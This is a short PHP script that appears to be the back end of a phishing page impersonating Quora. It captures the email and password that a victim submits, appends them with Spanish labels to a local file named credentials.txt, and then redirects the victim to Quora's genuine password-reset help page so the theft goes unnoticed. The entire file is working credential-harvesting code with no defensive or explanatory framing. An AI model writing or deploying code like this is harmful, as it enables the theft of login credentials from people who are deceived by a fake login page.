<?php

file_put_contents("credentials.txt", "[+] Quora -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-');
exit();
?>
